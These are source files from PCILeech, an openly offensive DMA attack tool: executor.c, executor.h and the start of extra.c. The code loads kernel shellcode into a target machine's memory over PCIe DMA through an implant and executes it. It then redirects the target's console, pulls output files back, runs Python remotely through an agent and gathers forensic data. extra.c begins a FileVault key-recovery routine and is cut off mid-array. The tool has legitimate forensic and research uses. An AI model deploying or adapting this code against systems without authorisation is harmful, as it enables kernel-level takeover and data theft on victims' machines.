// executor.c : implementation related 'code execution' and 'console redirect' functionality.
//
// (c) Ulf Frisk, 2016-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "executor.h"
#include "device.h"
#include "util.h"
#include "vmmx.h"

#define EXEC_IO_MAGIC                   0x12651232dfef9521
#define EXEC_IO_CONSOLE_BUFFER_SIZE     0x800
#define EXEC_IO_DMAOFFSET_IS            0x80000
#define EXEC_IO_DMAOFFSET_OS            0x81000

typedef struct tdEXEC_IO {
    QWORD magic;
    struct {
        QWORD cbRead;
        QWORD cbReadAck;
        QWORD Reserved[10];
        BYTE  pb[800];
    } con;
    struct {
        QWORD seq;
        QWORD seqAck;
        QWORD fCompleted;
        QWORD fCompletedAck;
    } bin;
    QWORD Reserved[395];
} EXEC_IO, *PEXEC_IO;

typedef struct tdCONSOLEREDIR_THREADDATA {
    HANDLE hThreadIS;
    HANDLE hThreadOS;
    PEXEC_IO pInfoIS;
    PEXEC_IO pInfoOS;
    BYTE pbDataISConsoleBuffer[4096];
    BYTE pbDataOSConsoleBuffer[4096];
    BOOL fTerminateThread;
} CONSOLEREDIR_THREADDATA, *PCONSOLEREDIR_THREADDATA;

typedef struct tdEXEC_HANDLE {
    PBYTE pbDMA;
    FILE *pFileOutput;
    QWORD qwFileWritten;
    QWORD fError;
    EXEC_IO is;
    EXEC_IO os;
} EXEC_HANDLE, *PEXEC_HANDLE;

// input buffer to targeted console (outgoing info)
// read from this console and send to targeted console
DWORD WINAPI ConsoleRedirect_ThreadConsoleInput(PCONSOLEREDIR_THREADDATA pd)
{
    DWORD cbWrite, cbModulo, cbModuloAck;
    while(!pd->fTerminateThread) {
        while(pd->pInfoOS->con.cbRead == pd->pInfoIS->con.cbReadAck) {
            Sleep(10);
            continue;
        }
        cbModulo = pd->pInfoOS->con.cbRead % EXEC_IO_CONSOLE_BUFFER_SIZE;
        cbModuloAck = pd->pInfoIS->con.cbReadAck % EXEC_IO_CONSOLE_BUFFER_SIZE;
        if(cbModuloAck < cbModulo) {
            cbWrite = cbModulo - cbModuloAck;
            printf("%.*s", cbWrite, pd->pInfoOS->con.pb + cbModuloAck);
        } else {
            cbWrite = EXEC_IO_CONSOLE_BUFFER_SIZE - cbModuloAck;
            printf("%.*s", cbWrite, pd->pInfoOS->con.pb + cbModuloAck);
        }
        pd->pInfoIS->con.cbReadAck += cbWrite;
    }
    return 0;
}

DWORD WINAPI ConsoleRedirect_ThreadConsoleOutput(PCONSOLEREDIR_THREADDATA pd)
{
    while(!pd->fTerminateThread) {
        *(pd->pInfoIS->con.pb + (pd->pInfoIS->con.cbRead % EXEC_IO_CONSOLE_BUFFER_SIZE)) = (BYTE)getchar();
        pd->pInfoIS->con.cbRead++;
        while(pd->pInfoIS->con.cbRead - pd->pInfoOS->con.cbReadAck >= EXEC_IO_CONSOLE_BUFFER_SIZE) {
            Sleep(10);
        }
    }
    return 0;
}

BOOL Exec_ConsoleRedirect_Initialize(_In_ QWORD ConsoleBufferAddr_InputStream, _In_ QWORD ConsoleBufferAddr_OutputStream, _In_ DWORD dwPID, _Inout_ PCONSOLEREDIR_THREADDATA pd)
{
    BOOL result;
    UNREFERENCED_PARAMETER(ConsoleBufferAddr_InputStream);
    pd->pInfoIS = (PEXEC_IO)pd->pbDataISConsoleBuffer;
    pd->pInfoOS = (PEXEC_IO)pd->pbDataOSConsoleBuffer;
    // read initial buffer and check validity
    result = dwPID ?
        VMMDLL_MemReadEx(dwPID, ConsoleBufferAddr_OutputStream, pd->pbDataOSConsoleBuffer, 0x1000, NULL, VMMDLL_FLAG_NOCACHE) :
        DeviceReadMEM(ConsoleBufferAddr_OutputStream, 0x1000, pd->pbDataOSConsoleBuffer, FALSE);
    if(!result || (pd->pInfoOS->magic != EXEC_IO_MAGIC)) {
        return FALSE;
    }
    // create worker threads
    pd->hThreadIS = CreateThread(NULL, 0, ConsoleRedirect_ThreadConsoleInput, pd, 0, NULL);
    pd->hThreadOS = CreateThread(NULL, 0, ConsoleRedirect_ThreadConsoleOutput, pd, 0, NULL);
    return TRUE;
}

/*
* Execute a console redirect
* -- ConsoleBufferAddr_InputStream = physical or virtual address.
* -- ConsoleBufferAddr_OutputStream = physical or virtual address.
* -- dwPID = zero if physical address read, non-zero if virtual address read.
*/
VOID Exec_ConsoleRedirect(_In_ QWORD ConsoleBufferAddr_InputStream, _In_ QWORD ConsoleBufferAddr_OutputStream, _In_ DWORD dwPID)
{
    BOOL result;
    PCONSOLEREDIR_THREADDATA pd = LocalAlloc(LMEM_ZEROINIT, sizeof(CONSOLEREDIR_THREADDATA));
    if(!pd) { return; }
    result = Exec_ConsoleRedirect_Initialize(ConsoleBufferAddr_InputStream, ConsoleBufferAddr_OutputStream, dwPID, pd);
    if(!result) {
        printf("\nCONSOLE_REDIRECT: Error: Address 0x%016llX does not\ncontain a valid console buffer.\n", ConsoleBufferAddr_OutputStream);
        goto fail;
    }
    // buffer syncer
    while(TRUE) {
        SwitchToThread();
        result = dwPID ?
            VMMDLL_MemReadEx(dwPID, ConsoleBufferAddr_OutputStream, pd->pbDataOSConsoleBuffer, 0x1000, NULL, VMMDLL_FLAG_NOCACHE) :
            DeviceReadMEM(ConsoleBufferAddr_OutputStream, 0x1000, pd->pbDataOSConsoleBuffer, FALSE);
        if(!result || pd->pInfoOS->magic != EXEC_IO_MAGIC) {
            printf("\nCONSOLE_REDIRECT: Error: Address 0x%016llX does not\ncontain a valid console buffer.\n", ConsoleBufferAddr_OutputStream);
            goto fail;
        }
        if(dwPID) {
            VMMDLL_MemWrite(dwPID, ConsoleBufferAddr_InputStream, pd->pbDataISConsoleBuffer, 0x1000);
        } else {
            DeviceWriteMEM(ConsoleBufferAddr_InputStream, 0x1000, pd->pbDataISConsoleBuffer, FALSE);
        }
    }
    fail:
    pd->fTerminateThread = TRUE;
}

VOID Exec_Callback(_Inout_ PHANDLE phCallback)
{
    BOOL result;
    PEXEC_HANDLE ph = *phCallback;
    QWORD cbLength;
    // initialize if not initialized previously.
    if(!*phCallback) {
        // core initialize
        ph = *phCallback = LocalAlloc(LMEM_ZEROINIT, sizeof(EXEC_HANDLE));
        if(!ph) { return; }
        ph->pbDMA = LocalAlloc(LMEM_ZEROINIT, (SIZE_T)ctxMain->pk->dataOutExtraLengthMax);
        if(!ph->pbDMA) { LocalFree(ph); *phCallback = NULL; return; }
        ph->is.magic = EXEC_IO_MAGIC;
        // open output file
        if(!fopen_s(&ph->pFileOutput, ctxMain->cfg.szFileOut, "r") || ph->pFileOutput) {
            if(ph->pFileOutput) {
                fclose(ph->pFileOutput);
            }
            printf("EXEC: Failed. File already exists: %s\n", ctxMain->cfg.szFileOut);
            return;
        }
        if(fopen_s(&ph->pFileOutput, ctxMain->cfg.szFileOut, "wb") || !ph->pFileOutput) {
            ph->is.bin.fCompletedAck = TRUE;
            LcWrite(ctxMain->hLC, ctxMain->pk->DMAAddrPhysical + EXEC_IO_DMAOFFSET_IS, 0x1000, (PBYTE)&ph->is);
            ph->fError = TRUE;
            printf("EXEC: Failed writing large outut to file: %s\n", ctxMain->cfg.szFileOut);
            return;
        }
        printf("EXEC: Start writing large output to file: %s\n", ctxMain->cfg.szFileOut);
    }
    // write to output file and ack to buffer
    if(ph->is.bin.fCompletedAck) { return; }
    LcRead(ctxMain->hLC, ctxMain->pk->DMAAddrPhysical + EXEC_IO_DMAOFFSET_OS, 0x1000, (PBYTE)&ph->os);
    if(ph->os.magic != EXEC_IO_MAGIC) { return; }
    if(ph->is.bin.seqAck >= ph->os.bin.seq) { return; }
    cbLength = 0;
    result =
        DeviceReadDMA(ctxMain->pk->DMAAddrPhysical + ctxMain->pk->dataOutExtraOffset, (DWORD)SIZE_PAGE_ALIGN_4K(ctxMain->pk->dataOutExtraLength), ph->pbDMA, NULL) &&
        (cbLength = fwrite(ph->pbDMA, 1, (SIZE_T)ctxMain->pk->dataOutExtraLength, ph->pFileOutput)) &&
        (ctxMain->pk->dataOutExtraLength == cbLength);
    ph->qwFileWritten += cbLength;
    ph->fError = !result;
    ph->is.bin.fCompletedAck = ph->is.bin.fCompletedAck || ph->os.bin.fCompleted || !result;
    ph->is.bin.seqAck = ph->os.bin.seq;
    LcWrite(ctxMain->hLC, ctxMain->pk->DMAAddrPhysical + EXEC_IO_DMAOFFSET_IS, 0x1000, (PBYTE)&ph->is);
}

VOID Exec_CallbackClose(_In_opt_ HANDLE hCallback)
{
    PEXEC_HANDLE ph = hCallback;
    if(hCallback == NULL) { return; }
    if(ph->pFileOutput) {
        if(ph->fError) {
            printf("EXEC: Failed writing large outut to file: %s\n", ctxMain->cfg.szFileOut);
        } else {
            printf("EXEC: Successfully wrote %i bytes.\n", (DWORD)ph->qwFileWritten);
        }
    }
    if(ph->pFileOutput) { fclose(ph->pFileOutput); }
    LocalFree(ph->pbDMA);
    LocalFree(ph);
}

_Success_(return)
BOOL Exec_ExecSilent(_In_ LPSTR szShellcodeName, _In_ PBYTE pbIn, _In_ QWORD cbIn, _Out_opt_ PBYTE *ppbOut, _Out_opt_ PQWORD pcbOut)
{
    PKMDDATA pk = ctxMain->pk;
    BOOL result = FALSE;
    DWORD cbBuffer;
    PBYTE pbBuffer = NULL;
    PKMDEXEC pKmdExec = NULL;
    //------------------------------------------------
    // 1: Setup and initial validity checks.
    //------------------------------------------------
    if(pcbOut) { *pcbOut = 0; }
    if(!ctxMain->phKMD) { goto fail; }
    result = Util_LoadKmdExecShellcode(szShellcodeName, &pKmdExec);
    if(!result) { goto fail; }
    cbBuffer = SIZE_PAGE_ALIGN_4K(pKmdExec->cbShellcode) + SIZE_PAGE_ALIGN_4K(cbIn);
    if(!result || (ctxMain->pk->DMASizeBuffer < cbBuffer)) { result = FALSE;  goto fail; }
    pbBuffer = LocalAlloc(LMEM_ZEROINIT, cbBuffer);
    if(!pbBuffer) { result = FALSE;  goto fail; }
    //------------------------------------------------
    // 2: Set up shellcode and indata and write to target memory.
    //    X, Y = page aligned.
    //    [0 , Y       [ = shellcode
    //    [Y , X       [ = data in (to target computer)
    //    [X , buf_max [ = data out (from target computer)
    //------------------------------------------------
    memcpy(pbBuffer, pKmdExec->pbShellcode, (SIZE_T)pKmdExec->cbShellcode);
    memcpy(pbBuffer + SIZE_PAGE_ALIGN_4K(pKmdExec->cbShellcode), pbIn, (SIZE_T)cbIn);
    result = DeviceWriteDMA_Retry(ctxMain->hLC, pk->DMAAddrPhysical, cbBuffer, pbBuffer);
    if(!result) { goto fail; }
    pk->dataInExtraOffset = SIZE_PAGE_ALIGN_4K(pKmdExec->cbShellcode);
    pk->dataInExtraLength = cbIn;
    pk->dataInExtraLengthMax = SIZE_PAGE_ALIGN_4K(cbIn);
    pk->dataOutExtraOffset = pk->dataInExtraOffset + pk->dataInExtraLengthMax;
    pk->dataOutExtraLength = 0;
    pk->dataOutExtraLengthMax = pk->DMASizeBuffer - pk->dataOutExtraOffset;
    //------------------------------------------------ 
    // 3: Execute!
    //------------------------------------------------
    KMD_SubmitCommand(KMD_CMD_VOID);
    result = KMD_SubmitCommand(KMD_CMD_EXEC);
    if(!result || pk->dataOut[0] || (pk->dataOutExtraLength > pk->dataOutExtraLengthMax)) {
        result = FALSE;
        goto fail;
    }
    //------------------------------------------------
    // 5: Display/Write additional output.
    //------------------------------------------------
    if(ppbOut && pcbOut) {
        *pcbOut = pk->dataOutExtraLength;
        *ppbOut = (PBYTE)LocalAlloc(0, SIZE_PAGE_ALIGN_4K(*pcbOut));
        if(!*ppbOut) { result = FALSE; goto fail; }
        result = SIZE_PAGE_ALIGN_4K(*pcbOut) == DeviceReadDMA(pk->DMAAddrPhysical + pk->dataOutExtraOffset, SIZE_PAGE_ALIGN_4K(*pcbOut), *ppbOut, NULL);
    }
fail:
    LocalFree(pKmdExec);
    LocalFree(pbBuffer);
    return result;
}

VOID ActionExecShellcode()
{
    BOOL result;
    PKMDEXEC pKmdExec = NULL;
    PBYTE pbBuffer = NULL;
    BYTE pbZeroPage2[0x2000] = { 0 };
    PSTR szBufferText = NULL;
    DWORD cbLength;
    FILE *pFile = NULL;
    PKMDDATA pk = ctxMain->pk;
    //------------------------------------------------ 
    // 1: Setup and initial validity checks.
    //------------------------------------------------
    if(!ctxMain->phKMD) {
        printf("EXEC: Failed. Executing code requires an active kernel module (KMD).\n      Please use in conjunction with the -kmd option only.\n");
        goto fail;
    }
    if(pk->DMASizeBuffer < 0x084000 + 0x100000 + min(0x100000, SIZE_PAGE_ALIGN_4K(ctxMain->cfg.cbIn))) {
        printf("EXEC: Failed. DMA buffer is too small / input size exceeded.\n");
        goto fail;
    }
    //------------------------------------------------ 
    // 2: Load KMD shellcode and commit to target memory.
    //------------------------------------------------
    result = Util_LoadKmdExecShellcode(ctxMain->cfg.szShellcodeName, &pKmdExec);
    if(!result) {
        printf("EXEC: Failed loading shellcode from file: '%s.ksh' ...\n", ctxMain->cfg.szShellcodeName);
        goto fail;
    }
    result = DeviceWriteDMA_Verify(ctxMain->hLC, pk->DMAAddrPhysical, (DWORD)pKmdExec->cbShellcode, pKmdExec->pbShellcode);
    if(!result) {
        printf("EXEC: Failed writing shellcode to target memory.\n");
        goto fail;
    }
    //------------------------------------------------ 
    // 3: Set up indata and write to target memory.
    //    Memory layout of DMA buffer:
    //    [0x000000, 0x080000[ = shellcode
    //    [0x080000          ] = (shellcode initiated com buffer for console and data transfer (input  to   implant) [IS])
    //    [0x081000          ] = (shellcode initiated com buffer for console and data transfer (output from implant) [OS])
    //    [0x082000, X       [ = data in (to target computer); X = max(0x100000, cb_in)
    //    [X       , buf_max [ = data out (from target computer)
    //------------------------------------------------
    LcWrite(ctxMain->hLC, pk->DMAAddrPhysical + 0x080000, 0x2000, pbZeroPage2);
    pk->dataInExtraOffset = 0x082000;
    pk->dataInExtraLength = ctxMain->cfg.cbIn;
    pk->dataInExtraLengthMax = max(0x100000, SIZE_PAGE_ALIGN_4K(ctxMain->cfg.cbIn));
    pk->dataOutExtraOffset = pk->dataInExtraOffset + pk->dataInExtraLengthMax;
    pk->dataOutExtraLength = 0;
    pk->dataOutExtraLengthMax = pk->DMASizeBuffer - pk->dataOutExtraOffset;
    memcpy(pk->dataIn, ctxMain->cfg.qwDataIn, sizeof(QWORD) * 10);
    memcpy(pk->dataInStr, ctxMain->cfg.szInS, MAX_PATH);
    memset(pk->dataOut, 0, sizeof(QWORD) * 10);
    memset(pk->dataOutStr, 0, MAX_PATH);
    if(ctxMain->cfg.cbIn) {
        result = LcWrite(ctxMain->hLC, pk->DMAAddrPhysical + pk->dataInExtraOffset, (DWORD)SIZE_PAGE_ALIGN_4K(ctxMain->cfg.cbIn), ctxMain->cfg.pbIn);
        if(!result) {
            printf("EXEC: Failed writing data to target memory.\n");
            goto fail;
        }
    }
    pk->dataInConsoleBuffer = 0;
    pk->dataOutConsoleBuffer = 0;
    //------------------------------------------------ 
    // 4: Execute! and display result.
    //------------------------------------------------
    KMD_SubmitCommand(KMD_CMD_VOID);
    result = KMD_SubmitCommand(KMD_CMD_EXEC);
    if(!result) {
        printf("EXEC: Failed sending execute command to KMD.\n");
        goto fail;
    }
    printf("EXEC: SUCCESS! shellcode should now execute in kernel!\nPlease see below for results.\n\n");
    printf(pKmdExec->szOutFormatPrintf,
        pk->dataOutStr,
        pk->dataOut[0],
        pk->dataOut[1],
        pk->dataOut[2],
        pk->dataOut[3],
        pk->dataOut[4],
        pk->dataOut[5],
        pk->dataOut[6],
        pk->dataOut[7],
        pk->dataOut[8],
        pk->dataOut[9]);
    //------------------------------------------------ 
    // 5: Display/Write additional output.
    //------------------------------------------------
    cbLength = (DWORD)pk->dataOutExtraLength;
    if(cbLength > 0) {
        // read extra output buffer
        if(!(pbBuffer = LocalAlloc(LMEM_ZEROINIT, SIZE_PAGE_ALIGN_4K(cbLength))) ||
            !DeviceReadDMA(pk->DMAAddrPhysical + pk->dataOutExtraOffset, SIZE_PAGE_ALIGN_4K(cbLength), pbBuffer, NULL)) {
            printf("EXEC: Error reading output.\n");
            goto fail;
        }
        // print to screen
        Util_PrintHexAscii(pbBuffer, cbLength, 0);
        // write to out file
        if(ctxMain->cfg.szFileOut[0]) {
            // open output file
            if(!fopen_s(&pFile, ctxMain->cfg.szFileOut, "r") || pFile) {
                printf("EXEC: Error writing output to file. File already exists: %s\n", ctxMain->cfg.szFileOut);
                goto fail;
            }
            if(fopen_s(&pFile, ctxMain->cfg.szFileOut, "wb") || !pFile) {
                printf("EXEC: Error writing output to file.\n");
                goto fail;
            }
            if(cbLength != fwrite(pbBuffer, 1, cbLength, pFile)) {
                printf("EXEC: Error writing output to file.\n");
                goto fail;
            }
            printf("EXEC: Wrote %i bytes to file %s.\n", cbLength, ctxMain->cfg.szFileOut);
        }
    }
    //----------------------------------------------------------
    // 6: Call the post execution console redirection if needed.
    //----------------------------------------------------------
    if(pk->dataInConsoleBuffer || pk->dataOutConsoleBuffer) {
        Exec_ConsoleRedirect(pk->dataInConsoleBuffer, pk->dataOutConsoleBuffer, 0);
    }
    printf("\n");
fail:
    LocalFree(pKmdExec);
    LocalFree(pbBuffer);
    LocalFree(szBufferText);
    if(pFile) { fclose(pFile); }
}

VOID ActionAgentExecPy()
{
    BOOL result;
    DWORD cbResult = 0;
    PBYTE pbResult = NULL;
    FILE *pFile = NULL;
    if(!ctxMain->cfg.pbIn || (ctxMain->cfg.cbIn < 4)) {
        printf("AGENT-PYEXEC: Failed. Input file not valid. Please supply input file in -in option.\n");
        return;
    }
    printf("AGENT-PYEXEC: Sending script to remote LeechAgent for processing.\n");
    printf("AGENT-PYEXEC: Waiting for result ...\n");
    result = LcCommand(ctxMain->hLC, LC_CMD_AGENT_EXEC_PYTHON, (DWORD)ctxMain->cfg.cbIn, ctxMain->cfg.pbIn, &pbResult, &cbResult);
    if(!result) {
        printf("AGENT-PYEXEC: Failed.\n");
        return;
    }
    if(pbResult && (cbResult > 0)) {
        cbResult -= 1;  // remove length of string null terminator.
        // write to out file
        if(ctxMain->cfg.szFileOut[0]) {
            // open output file
            if(!fopen_s(&pFile, ctxMain->cfg.szFileOut, "r") || pFile) {
                printf("AGENT-PYEXEC: Error writing output to file. File already exists: %s\n", ctxMain->cfg.szFileOut);
                goto fail;
            }
            if(fopen_s(&pFile, ctxMain->cfg.szFileOut, "wb") || !pFile) {
                printf("AGENT-PYEXEC: Error writing output to file.\n");
                goto fail;
            }
            if(cbResult != fwrite(pbResult, 1, cbResult, pFile)) {
                printf("AGENT-PYEXEC: Error writing output to file.\n");
                goto fail;
            }
            printf("AGENT-PYEXEC: Wrote %i bytes to file %s.\n", cbResult, ctxMain->cfg.szFileOut);
        }
        // print to screen
        printf("AGENT-PYEXEC: Please see result below: \n================================ \n");
        Util_AsciiFilter(pbResult, cbResult); // filter away potentially harmful chars from untrusted remote input
        printf("%s\n", (LPSTR)pbResult);
    }

fail:
    if(pFile) { fclose(pFile); }
    LcMemFree(pbResult);
}

#ifdef _WIN32

DWORD ActionAgentForensic_OutFileDirectory(_Out_writes_z_(MAX_PATH) LPSTR szFilePrefix, _In_ LPSTR szUniqueTag)
{
    SYSTEMTIME st;
    GetLocalTime(&st);
    _snprintf_s(
        szFilePrefix,
        MAX_PATH,
        _TRUNCATE,
        "%s%sforensic-%i%02i%02i-%02i%02i%02i-%s",
        ctxMain->cfg.szFileOut[0] ? ctxMain->cfg.szFileOut : "",
        ctxMain->cfg.szFileOut[0] ? "\\" : "",
        st.wYear,
        st.wMonth,
        st.wDay,
        st.wHour,
        st.wMinute,
        st.wSecond,
        szUniqueTag);
    return (DWORD)strlen(szFilePrefix);
}

VOID ActionAgentForensic_GetFile(_In_ LPSTR szRemoteFile, _In_ LPSTR szOutFile, _In_ QWORD qwSize)
{
    FILE *hFile = NULL;
    LC_CMD_AGENT_VFS_REQ Req = { 0 };
    PLC_CMD_AGENT_VFS_RSP pRsp = NULL;
    HANDLE hConsole;
    CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
    Req.dwVersion = LC_CMD_AGENT_VFS_REQ_VERSION;
    strncpy_s(Req.uszPathFile, _countof(Req.uszPathFile), szRemoteFile, _TRUNCATE);
    if(fopen_s(&hFile, szOutFile, "wb")) {
        printf("AGENT-ELASTIC: failed open local file %s\n", szOutFile);
        goto fail;
    }
    printf("    Local File: %s\n    Progress:     0%%", szOutFile);
    hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    GetConsoleScreenBufferInfo(hConsole, &consoleInfo);
    consoleInfo.dwCursorPosition.X -= 4;
    while((Req.dwLength = min(0x01000000, (DWORD)(qwSize - Req.qwOffset)))) {
        if(!LcCommand(ctxMain->hLC, LC_CMD_AGENT_VFS_READ, sizeof(LC_CMD_AGENT_VFS_REQ), (PBYTE)&Req, (PBYTE*)&pRsp, NULL) || !pRsp || !pRsp->cb) {
            printf("\nAGENT-FORENSIC: Failed reading remote file.\n");
            goto fail;
        }
        if(pRsp->cb != fwrite(pRsp->pb, 1, pRsp->cb, hFile)) {
            LocalFree(pRsp);
            printf("\nAGENT-FORENSIC: failed write to local file %s\n", szOutFile);
            break;
        }
        LocalFree(pRsp);
        Req.qwOffset += Req.dwLength;
        SetConsoleCursorPosition(hConsole, consoleInfo.dwCursorPosition);
        printf("%3lli%%", ((Req.qwOffset * 100) / qwSize));
    }
    printf("\n");
fail:
    if(hFile) { fclose(hFile); }
}

/*
* Retrieve forensic mode JSON data from the remote system. This is achieved by
* starting MemProcFS as a child-process remotely and accessing its virtual file
* system. The JSON data retrieved is compatible with ElasticSearch.
*/
VOID ActionAgentForensic()
{
    CHAR szPercent[4] = { 0 }, szRemoteFile[MAX_PATH] = { 0 }, szLocalFile[MAX_PATH] = { 0 };
    CHAR szTag[18] = { 0 };
    LPSTR szFile;
    DWORD i, cPercent = 0, cbResult = 0, cchLocalFileDirectory;
    PBYTE pbResult = NULL;
    PLC_CMD_AGENT_VFS_REQ pReq = NULL;
    PLC_CMD_AGENT_VFS_RSP pRsp = NULL;
    PVMMDLL_VFS_FILELISTBLOB pVfsList;
    HANDLE hConsole;
    CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
    
    // Initial setup
    if(!(pReq = LocalAlloc(LMEM_ZEROINIT, sizeof(LC_CMD_AGENT_VFS_REQ) + 1))) { goto fail; }
    pReq->dwVersion = LC_CMD_AGENT_VFS_REQ_VERSION;
    strncpy_s(pReq->uszPathFile, _countof(pReq->uszPathFile), "\\forensic\\forensic_enable.txt", _TRUNCATE);

    // Enable/verify forensic mode '1' - in-memory database
    pReq->cb = 1;
    pReq->pb[0] = '1';
    if(!LcCommand(ctxMain->hLC, LC_CMD_AGENT_VFS_WRITE, sizeof(LC_CMD_AGENT_VFS_REQ) + 1, (PBYTE)pReq, NULL, NULL)) {
        printf("AGENT-FORENSIC: Failed to connect to the remote system or enable memory analysis.\n");
        goto fail;
    }
    pReq->cb = 0;
    pReq->dwLength = 3;
    if(!LcCommand(ctxMain->hLC, LC_CMD_AGENT_VFS_READ, sizeof(LC_CMD_AGENT_VFS_REQ), (PBYTE)pReq, (PBYTE*)&pRsp, NULL) || !pRsp || !pRsp->cb || pRsp->pb[0] != '1') {
        printf("AGENT-FORENSIC: Failed start remote forensic mode memory analysis.\n");
        goto fail;
    }
    LocalFree(pRsp); pRsp = NULL;

    // Get Unique Tag
    strncpy_s(pReq->uszPathFile, _countof(pReq->uszPathFile), "\\sys\\unique-tag.txt", _TRUNCATE);
    pReq->cb = 0;
    pReq->dwLength = 17;
    if(!LcCommand(ctxMain->hLC, LC_CMD_AGENT_VFS_READ, sizeof(LC_CMD_AGENT_VFS_REQ), (PBYTE)pReq, (PBYTE*)&pRsp, NULL) || !pRsp || !pRsp->cb || (pRsp->cb > 17)) {
        printf("AGENT-FORENSIC: Failed retrieving unique tag.\n");
        goto fail;
    }
    memcpy(szTag, pRsp->pb, pRsp->cb);
    LocalFree(pRsp); pRsp = NULL;
    printf("AGENT-FORENSIC: Remote System Tag: %s\n", szTag);

    // Watch for progress until 100%
    printf("AGENT-FORENSIC: Connected. Remote forensic memory analysis:   0%%");
    hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    GetConsoleScreenBufferInfo(hConsole, &consoleInfo);
    consoleInfo.dwCursorPosition.X -= 4;
    cPercent = 0;
    strncpy_s(pReq->uszPathFile, _countof(pReq->uszPathFile), "\\forensic\\progress_percent.txt", _TRUNCATE);
    pReq->cb = 0;
    pReq->dwLength = 3;
    while(cPercent != 100) {
        Sleep(250);
        if(!LcCommand(ctxMain->hLC, LC_CMD_AGENT_VFS_READ, sizeof(LC_CMD_AGENT_VFS_REQ), (PBYTE)pReq, (PBYTE*)&pRsp, NULL) || !pRsp) {
            printf("\nAGENT-FORENSIC: Failed to retrieve progress percent ...\n");
            goto fail;
        }
        memcpy(szPercent, pRsp->pb, min(3, pRsp->cb));
        LocalFree(pRsp); pRsp = NULL;
        cPercent = atoi(szPercent);
        SetConsoleCursorPosition(hConsole, consoleInfo.dwCursorPosition);
        printf("%3i%%", cPercent);
    }

    // Retrieve /forensic/json directory info and print file list:
    strncpy_s(pReq->uszPathFile, _countof(pReq->uszPathFile), "\\forensic\\json", _TRUNCATE);
    pReq->dwLength = 0;
    if(!LcCommand(ctxMain->hLC, LC_CMD_AGENT_VFS_LIST, sizeof(LC_CMD_AGENT_VFS_REQ), (PBYTE)pReq, (PBYTE*)&pRsp, NULL) || !pRsp) {
        printf("AGENT-FORENSIC: Failed to retrieve file info.\n");
        goto fail;
    }
    pVfsList = (PVMMDLL_VFS_FILELISTBLOB)pRsp->pb;                          // sanity/security checks on remote deta done in leechcore
    pVfsList->uszMultiText = pVfsList->uszMultiText + (QWORD)pVfsList;      // fixup relative uszMultiText offset
    if(pVfsList->cFileEntry > 16) {
        printf("AGENT-FORENSIC: Too many files on remote system (%i).\n", pVfsList->cFileEntry);
        goto fail;
    }
    cchLocalFileDirectory = ActionAgentForensic_OutFileDirectory(szLocalFile, szTag);
    CreateDirectoryA(szLocalFile, NULL);
    printf("\nRemote Files:\n");
    for(i = 0; i < pVfsList->cFileEntry; i++) {
        if(pVfsList->FileEntry[i].cbFileSize != -1) {
            szFile = pVfsList->uszMultiText + pVfsList->FileEntry[i].ouszName;
            printf("  %s\t\t[%lli MB]\n", szFile, pVfsList->FileEntry[i].cbFileSize / (1024 * 1024));
            if(!strcmp(szFile, "general.json") || !strcmp(szFile, "registry.json") || !strcmp(szFile, "timeline.json")) {
                _snprintf_s(szRemoteFile, _countof(szRemoteFile), _TRUNCATE, "\\forensic\\json\\%s", szFile);
                _snprintf_s(szLocalFile + cchLocalFileDirectory, _countof(szLocalFile) - cchLocalFileDirectory, _TRUNCATE, "\\%s", szFile);
                ActionAgentForensic_GetFile(szRemoteFile, szLocalFile, pVfsList->FileEntry[i].cbFileSize);
            }
        }
    }
    printf("Completed!\n\n");
fail:
    LocalFree(pReq);
    LocalFree(pRsp);
}

#endif /* _WIN32 */
#ifdef LINUX

VOID ActionAgentForensic()
{
    printf("Command 'agent-elastic' is only supported on Windows.\n");
}

#endif /* LINUX */

```

`pcileech/executor.h`:

```h
// executor.h : definitions related to 'code execution' and 'console redirect' functionality.
//
// (c) Ulf Frisk, 2016-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#ifndef __EXECUTOR_H__
#define __EXECUTOR_H__
#include "pcileech.h"
#include "oscompatibility.h"
#include "kmd.h"

/*
* Execute a console redirect
* -- ConsoleBufferAddr_InputStream = physical or virtual address.
* -- ConsoleBufferAddr_OutputStream = physical or virtual address.
* -- dwPID = zero if physical address read, non-zero if virtual address read.
*/
VOID Exec_ConsoleRedirect(_In_ QWORD ConsoleBufferAddr_InputStream, _In_ QWORD ConsoleBufferAddr_OutputStream, _In_ DWORD dwPID);

/*
* Callback for when kernel executable code is in "extended execution mode".
* This will allow the kernel executable code running on the target machine to
* communicate interactively with this executable to deliver large files.
* -- phCallback = ptr to handle; handle must be null on first entry.
*/
VOID Exec_Callback(_Inout_ PHANDLE phCallback);

/*
* Close handle opened/used in Exec_Callback.
* -- hCallback = handle to close.
*/
VOID Exec_CallbackClose(_In_opt_ HANDLE hCallback);

/*
* Execute specified shellcode silently (do not display anything on-screen).
* This function is to be called internally by PCILeech functionality that
* require more advanced kernel functionality than the core implant is able
* to provide.
* -- szShellcodeName
* -- pbIn = binary data to send to shellcode executing on the target.
* -- cbIn
* -- ppbOut = ptr to receive allocated buffer containing the result.
*      Callers responsibility to call LocalFree(*ppbOut).
* -- pcbOut
* -- result
*/
_Success_(return)
BOOL Exec_ExecSilent(_In_ LPSTR szShellcodeName, _In_ PBYTE pbIn, _In_ QWORD cbIn, _Out_opt_ PBYTE *ppbOut, _Out_opt_ PQWORD pcbOut);

/*
* Try to execute a shellcode module in the target system kernel. This function
* requires a KMD to be loaded. The KMD is then used to load and execute the
* code supplied in the target system!
*/
VOID ActionExecShellcode();

/*
* Try execute python code on a remote host in the context of the LeechSvc.
*/
VOID ActionAgentExecPy();

/*
* Retrieve remote elasticsearch forensic information.
*/
VOID ActionAgentForensic();

#endif /* __EXECUTOR_H__ */

```

`pcileech/extra.c`:

```c
// extra.c : implementation related various extra functionality such as exploits.
//
// (c) Ulf Frisk, 2016-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "extra.h"
#include "device.h"
#include "util.h"

VOID Extra_MacFVRecover_ReadMemory_Optimized(_Inout_ PBYTE pb512M)
{
    DWORD i, dwOffsets[] = {
        0x74000000, 0x75000000, 0x76000000, 0x77000000, 0x78000000, 0x79000000, 0x7a000000, 0x7b000000,
        0x7c000000, 0x7d000000, 0x7e000000, 0x7f000000, 0x80000000, 0x81000000, 0x82000000, 0x83000000,
        0x84000000, 0x85000000, 0x86000000, 0x87000000, 0x70000000, 0x71000000, 0x72000000, 0x73000000,
